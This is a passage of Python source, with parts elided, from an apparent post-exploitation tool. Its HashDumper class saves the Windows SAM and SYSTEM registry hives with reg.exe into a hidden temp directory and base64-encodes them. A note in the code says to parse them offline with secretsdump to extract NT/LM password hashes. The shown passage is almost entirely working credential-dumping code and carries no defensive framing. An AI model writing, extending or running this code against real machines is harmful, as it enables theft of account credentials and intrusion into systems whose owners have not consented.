...
class HashDumper:
    ...
    def dump_windows_hashes(self):
        ...
        tmpdir = None
        try:
            # Technique: reg save the SAM/SYSTEM/SECURITY hives to a temp dir,
            # then read them for offline cracking (secretsdump-style). Requires
            # admin/SYSTEM like every SAM extraction path.
            tmpdir = tempfile.mkdtemp(prefix=".sam_")
            hive_map = {
                "sam": "HKLM\\SAM",
                "system": "HKLM\\SYSTEM",
            ...
            captured = {}
            for label, hive in hive_map.items():
                dst = os.path.join(tmpdir, label)
                r = subprocess.run(
                    ["reg.exe", "save", hive, dst, "/y"],
                    capture_output=True, timeout=30
                )
                if r.returncode == 0 and os.path.exists(dst):
                    with open(dst, "rb") as f:
                        captured[label] = base64.b64encode(f.read()).decode()
            if captured:
                hashes["windows_hives"] = captured
                hashes["windows_parse_note"] = (
                    "Hives captured; parse offline (secretsdump --sam --system) "
                    "to extract NT/LM hashes."
                )
            else:
                hashes["error"] = (
                    "reg save failed - SAM extraction requires admin/SYSTEM "
                    "privileges"
                )
        except Exception as e:
